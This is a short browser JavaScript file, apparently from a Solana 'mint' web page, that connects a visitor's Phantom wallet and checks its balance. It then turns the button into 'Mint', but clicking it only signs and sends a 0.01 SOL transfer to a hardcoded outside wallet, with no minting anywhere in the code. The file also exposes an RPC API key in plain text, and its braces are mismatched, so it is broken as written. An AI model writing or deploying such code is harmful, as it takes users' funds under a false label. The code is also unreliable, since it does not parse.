// Ensure Buffer is available in the browser for Solana web3
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = buffer.Buffer;
}

$(document).ready(function () {
  $('#connect-wallet').on('click', async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        const resp = await window.solana.connect();
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
          'https://mainnet.helius-rpc.com/?api-key=694c477f-7093-40cd-8456-30fa1e8f888a',
          'confirmed'
        );

        const senderWallet = new solanaWeb3.PublicKey(resp.publicKey.toString());
        const balance = await connection.getBalance(senderWallet);
        console.log("Wallet balance:", balance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        if (balance < minBalance) {
          alert("Insufficient funds for rent.");
          return;
        }
                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
          try {
          const receiverWallet = new solanaWeb3.PublicKey("ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5");

          const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: senderWallet,
              toPubkey: receiverWallet,
              lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL),
            })
          );

          transaction.feePayer = senderWallet;
          const blockhashObj = await connection.getLatestBlockhash();
          transaction.recentBlockhash = blockhashObj.blockhash;

          const signed = await window.solana.signTransaction(transaction);
          console.log("Transaction signed:", signed);

          const txid = await connection.sendRawTransaction(signed.serialize());
          await connection.confirmTransaction(txid);
          console.log("Transaction confirmed:", txid);
        } catch (err) {
          console.error("Error during minting:", err);
        }
      } catch (err) {
        console.error("Error connecting to Phantom Wallet:", err);
      }
    } else {
      alert("Phantom extension not found.");
      const isFirefox = typeof InstallTrigger !== "undefined";
      const isChrome = !!window.chrome;

      if (isFirefox) {
        window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
      } else if (isChrome) {
        window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
      } else {
        alert("Please download the Phantom extension for your browser.");
      }
    }
  });
});
